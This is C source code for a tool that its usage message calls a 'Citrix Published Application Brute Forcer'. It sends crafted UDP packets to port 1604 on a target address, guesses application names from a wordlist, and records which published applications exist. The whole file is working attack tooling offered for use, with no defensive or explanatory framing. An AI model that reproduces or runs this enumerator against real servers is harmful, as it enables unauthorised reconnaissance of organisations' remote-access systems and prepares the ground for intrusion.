#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <ctype.h>


#define NBNAME "TESTTEST"
// 8 characters required, capitalization may not matter...

FILE *readpa;
FILE *outpa;

struct sockaddr_in servaddr;

char hi_packet[] =
"\x1e\x00\x01\x30\x02\xfd"
"\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00";

char lo_packet[] =
"\x30\x00\x02\x31"
"\x02\xfd\xa8\xe3\x02\x00\x06\x44\xc0\xa8\x00\xf7\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00";

char good_packet_snip[] =
"\x3e\x00\x02\x35\x02\xfd";

char bad_packet_snip[] =
"\x20\x00\x01\x3a\x02\xfd";


int main(int argc, char **argv)
{

  int sockfd;

  if (argc != 4) {
     fprintf(stderr, "Citrix Published Application Brute Forcer by: wirepair\n");
     fprintf(stderr, "Usage %s <pa infile> <pa outfile> <ip.ip.ip.ip>\n\n", argv[0]);
     exit(-1);
  }

  readpa = fopen(argv[1],"r");
  if (! readpa) {
     fprintf(stderr, "Error opening file: %s\n", argv[1]);
     exit(-1);
  }

  outpa = fopen(argv[2],"w");
  if (! outpa) {
     fprintf(stderr, "Error opening file: %s for writing\n", argv[2]);
     exit(-1);
  }


  bzero(&servaddr, sizeof(servaddr));
  servaddr.sin_family = AF_INET;
  servaddr.sin_port = htons(1604);
  inet_pton(AF_INET, argv[3], &servaddr.sin_addr);

  sockfd = socket(AF_INET, SOCK_DGRAM, 0);

  sendpackets(argv[3], outpa, readpa, sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr));

  close(outpa);
  close(readpa);
  return(0);
}

int sendpackets(char *ip, FILE *outpa, FILE *readpa, int sockfd, const struct sockaddr *server, socklen_t servlen)
{
  int n, x, len, appsize, appsize2;
  int count = 0;
  char recvline[512], app_line[256];
  char app_packet[300];
  char *tmp;

  char fill_appkt[] =
  "\x00\x02\x34\02\xfd"
  "\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x00\x00\x26\x00\x02";

  char fill_appkt2[] =
  "\x00\x00\x00\x00";
  char fill_appkt3[] =
  "\x01\x00\x04";

  char nbname[] = NBNAME;

  while(fgets(app_line, sizeof(app_line),readpa) != NULL) {

     app_line[strlen(app_line)-1] = '\0';
     tmp = app_line;
     while(*tmp)
	*tmp++ = toupper(*tmp);

     sendto(sockfd, &hi_packet, sizeof(hi_packet), 0, server, servlen);

     n = recvfrom(sockfd, recvline, 128, 0, NULL, NULL);

     if (count != 1) {
       if (n == 48) {
          printf("Server Up, Enumerating Published Applications\n\n\n");
          count = 1;
       } else {
          fprintf(stderr, "Server responded but with unidentified packet, or is not up\n");
          exit(-3);
       }
     }

    appsize = 52 + strlen(app_line);
    appsize2 = 39 + strlen(app_line);

    x = 0; len = 0;
/***********************************/

    app_packet[x++] = appsize;

/************************************/

    len = sizeof(fill_appkt);
    memcpy(&app_packet[x], fill_appkt, len);
    x += len;

/***********************************/

    app_packet[x++] = appsize2;

/***********************************/

    len = sizeof(fill_appkt2);
    memcpy(&app_packet[x], fill_appkt2, len);
    x += len;

/**********************************/

    len = strlen(app_line); // this
    memcpy(&app_packet[x], app_line, len+1);
    x += len+1;

/***********************************/

    len = sizeof(fill_appkt3);
    memcpy(&app_packet[x], fill_appkt3, len);
    x += len;

/**********************************/

    len = strlen(nbname);
    memcpy(&app_packet[x], nbname, len+1);
    x += len+1;

/*********************************/

    sendto(sockfd, &app_packet, x, 0, server, servlen);

    n = recvfrom(sockfd, recvline, 128, 0, NULL, NULL);

    if (n == 62) {
        fprintf(outpa, "%s|%s\n", ip, app_line);
        fprintf(stderr, "%s is a published application\n", app_line);
    } else if (n == 32) {
        fprintf(stderr, "published app: %s is not a valid application\n", app_line);
    } else {
      fprintf(stderr, "Unexpected Response\n");
    }

  }
  return(0);
}

